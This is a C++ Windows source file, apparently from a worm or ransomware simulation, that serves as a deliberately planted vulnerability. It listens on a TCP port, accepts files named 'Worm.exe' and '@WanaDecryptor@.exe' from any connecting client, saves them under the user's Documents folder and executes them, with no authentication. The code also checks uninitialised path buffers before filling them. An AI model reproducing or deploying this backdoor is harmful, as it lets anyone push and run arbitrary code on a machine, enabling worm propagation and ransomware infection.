// Vulnerability.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "../Common/common.h"
#include "../Common/socktool.h"
#include <Windows.h>
#include <ShlObj.h>
#include <stdio.h>
#include "Vulnerability.h"
#pragma comment(lib,  "ws2_32.lib") 

INT RecvCode(SOCKET s)
{
	UCHAR code = 0;
	if (!RecvAll(s, (CHAR*)& code, sizeof(code), 0)) {
		return -1;
	}
	return code;
}

INT SendCode(SOCKET s, UCHAR code)
{
	if (!SendAll(s, (CHAR*)& code, sizeof(code), 0)) {
		return -1;
	}
	return 0;
}

INT ReplyPing(SOCKET s)
{
	CHAR replycode = 81;
	if (!SendAll(s, &replycode, sizeof(replycode), 0)) {
		return FALSE;
	}
	return TRUE;
}

INT InitWormFile(LPTSTR filename)
{
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		filename);
	_tcscat_s(filename, MAX_PATH,
		_T("\\BAD_APP"));
	if (GetFileAttributes(filename) ==
		INVALID_FILE_ATTRIBUTES) {
		CreateDirectory(filename, 0);
	}
	_tcscat_s(filename, MAX_PATH,
		_T("\\Worm.exe"));
	return TRUE;
}

INT InitPayloadFile(LPTSTR filename)
{
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		filename);
	_tcscat_s(filename, MAX_PATH,
		_T("\\BAD_APP"));
	if (GetFileAttributes(filename) ==
		INVALID_FILE_ATTRIBUTES) {
		CreateDirectory(filename, 0);
	}
	_tcscat_s(filename, MAX_PATH,
		_T("\\@WanaDecryptor@.exe"));
	return TRUE;
}

INT checkfile(LPCTSTR filename)
{
	if (GetFileAttributes(filename) !=
		INVALID_FILE_ATTRIBUTES) {
		DEBUG("%s exists\n", filename);
		return FALSE;
	}
	return TRUE;
}

INT SaveFile(SOCKET s, LPCTSTR filename)
{
	DWORD filesize;
	DWORD readsize = 0;
	DWORD writesize = 0;
	DWORD result = 0;
	UCHAR replycode = 0;
	DEBUG("recv filesize\n");
	if (!RecvAll(
		s,
		(CHAR*)& filesize,
		sizeof(filesize),
		0)) {
		DEBUG("server: recv failed with error: %d\n",
			WSAGetLastError());
		return FALSE;
	}
	DEBUG("filesize=%d\n", filesize);
	if (SendCode(s, EXECOK) < 0) {
		DEBUG("server: recv failed with error: %d\n",
			WSAGetLastError());
		return FALSE;
	}
	DEBUG("file size %d\n", filesize);
	HANDLE hFile = CreateFile(filename,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	DEBUG("Get filesize %d\n", filesize);
	while (writesize < filesize) {
		CHAR buffer[4096];
		readsize = filesize - writesize;
		if (readsize > sizeof(buffer)) {
			readsize = sizeof(buffer);
		}
		DEBUG("read block %d\n", readsize);
		if (!RecvAll(
			s,
			buffer,
			readsize,
			0)) {
			DEBUG("server: recv failed with error: %d\n",
				WSAGetLastError());
			CloseHandle(hFile);
			return FALSE;
		}
		if (!WriteFile(
			hFile,
			buffer,
			readsize,
			&result,
			0) || readsize != result) {
			DEBUG("Write %s error\n", filename);
			CloseHandle(hFile);
			return FALSE;
		}
		DEBUG("write %d bytes\n", result);
		if (SendCode(s, EXECOK) < 0) {
			DEBUG("server: recv failed with error: %d\n",
				WSAGetLastError());
			CloseHandle(hFile);
			return FALSE;
		}
		writesize += readsize;
	}
	DEBUG("close %s\n", filename);
	CloseHandle(hFile);
	return TRUE;
}

INT ExecFile(LPTSTR commandline)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DEBUG("exec: %s\n", commandline);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (!CreateProcess(NULL,   // No module name (use command line)
		commandline,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		DEBUG("CreateProcess failed (%d).\n", GetLastError());
		return FALSE;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return TRUE;
}

DWORD WINAPI ServerThread(LPVOID pParam) {
	SOCKET ClientSocket = *((SOCKET*)pParam);
	UCHAR cmdcode = 0, replycode = 82;
	INT iResult = 0;
	BOOL bDone = FALSE;
	DEBUG("Server Recv\n");
	if (!RecvAll(
		ClientSocket,
		(CHAR*)& cmdcode,
		sizeof(cmdcode),
		0)) {
		DEBUG("server: recv failed with error: %d\n",
			WSAGetLastError());
		DEBUG("closesocket\n");
		closesocket(ClientSocket);
		return FALSE;
	}
	DEBUG("got cmdcode: %d\n", cmdcode);
	TCHAR wormfile[MAX_PATH];
	TCHAR payload[MAX_PATH];
	switch ((UCHAR)cmdcode) {
	case PING:
		DEBUG("receive ping 0x%x\n", cmdcode);
		if (SendCode(ClientSocket, PONG) < 0) {
			DEBUG("reply ping fails\n");
			break;
		}
		DEBUG("reply ping successfully\n");
		break;
	case EXEC:
		DEBUG("receive 0x%x\n", cmdcode);
		replycode = checkfile(wormfile) &&
			checkfile(payload) ? EXECOK : EXECFAIL;
		DEBUG("send reply %d\n", replycode);
		if (SendCode(ClientSocket, replycode) < 0 ||
			replycode == EXECFAIL) {
			DEBUG("reply exec %d\n", replycode);
			break;
		}
		if (!InitWormFile(wormfile)) {
			DEBUG("get payload fails\n");
			break;
		}
		if (!InitPayloadFile(payload)) {
			DEBUG("get payload fails\n");
			break;
		}
		DEBUG("get worm\n");
		if (!SaveFile(ClientSocket, wormfile)) {
			DEBUG("SaveFile fails\n");
			break;
		}
		DEBUG("save %s done\n", wormfile);
		DEBUG("get payload\n");
		if (!SaveFile(ClientSocket, payload)) {
			DEBUG("SaveFile fails\n");
			break;
		}
		DEBUG("SaveFile successfully\n");
		ExecFile(payload);
		/*
		TCHAR commandline[MAX_PATH * 2 + 4];
		_stprintf_s(commandline,
			sizeof(commandline) / sizeof(TCHAR),
			_T("%s %s"), wormfile, payload);
		ExecFile(commandline);
		DEBUG("exec reply %d\n", replycode);
		DEBUG("Exec successfully\n");
		*/
		bDone = TRUE;
		break;
	default:
		DEBUG("unknown command: %d\n", cmdcode);
		break;
	}
	// cleanup
	DEBUG("shutdown\n");
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		DEBUG("server: shutdown failed with error: %d\n",
			WSAGetLastError());
	}
	DEBUG("closesocket ClientSocket\n");
	closesocket(ClientSocket);
	if (cmdcode == EXEC && bDone) {
		ExecFile(payload);
		TCHAR commandline[MAX_PATH * 2 + 4];
		_stprintf_s(commandline,
			sizeof(commandline) / sizeof(TCHAR),
			_T("%s %s"), wormfile, payload);
		ExecFile(commandline);
		DEBUG("exec reply %d\n", replycode);
		DEBUG("Exec successfully\n");
	}
	return TRUE;
}

INT Vulnerability(CONST CHAR* port)
{
	WSADATA wsaData;
	INT iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	DEBUG("server: getaddrinfo\n");
	// Resolve the server address and port
	iResult = getaddrinfo(
		NULL,
		port,
		&hints,
		&result);
	if (iResult != 0) {
		DEBUG("getaddrinfo failed with error: %d\n",
			iResult);
		WSACleanup();
		return FALSE;
	}
	DEBUG("server: socket\n");
	// Create a SOCKET for connecting to server
	ListenSocket = socket(
		result->ai_family,
		result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		DEBUG("server: socket failed with error: %ld\n",
			WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return FALSE;
	}
	DEBUG("server: setsockopt\n");
	BOOL bReuseaddr = TRUE;
	setsockopt(
		ListenSocket,
		SOL_SOCKET,
		SO_REUSEADDR,
		(CONST CHAR*)& bReuseaddr,
		sizeof(BOOL));
	DEBUG("server: bind\n");
	// Setup the TCP listening socket
	iResult = bind(
		ListenSocket,
		result->ai_addr,
		(INT)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		DEBUG("server: bind failed with error: %d\n",
			WSAGetLastError());
		freeaddrinfo(result);
		goto ERREXIT;
	}
	DEBUG("server: freeaddrinfo\n");
	freeaddrinfo(result);
	DEBUG("server: listen\n");
	iResult = listen(
		ListenSocket,
		SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		DEBUG("server: listen failed with error: %d\n",
			WSAGetLastError());
		goto ERREXIT;
	}

	while (TRUE) {
		// Accept a client socket
		DEBUG("server: accept\n");
		ClientSocket = accept(
			ListenSocket,
			NULL,
			NULL);
		if (ClientSocket == INVALID_SOCKET) {
			DEBUG("server: accept failed with error: %d\n",
				WSAGetLastError());
			continue;
		}
		HANDLE hThread = CreateThread(
			NULL,
			0,
			ServerThread,
			&ClientSocket,
			0,
			NULL);
		WaitForSingleObject(
			hThread,
			INFINITE);
		CloseHandle(hThread);
	}
	DEBUG("closesocket ListenSocket\n");
	closesocket(ListenSocket);
	WSACleanup();
	return TRUE;
ERREXIT:
	DEBUG("closesocket ListenSocket\n");
	closesocket(ListenSocket);
	WSACleanup();
	return FALSE;
}

INT main()
{
	Vulnerability(HOLE_PORT);
	return 0;
}
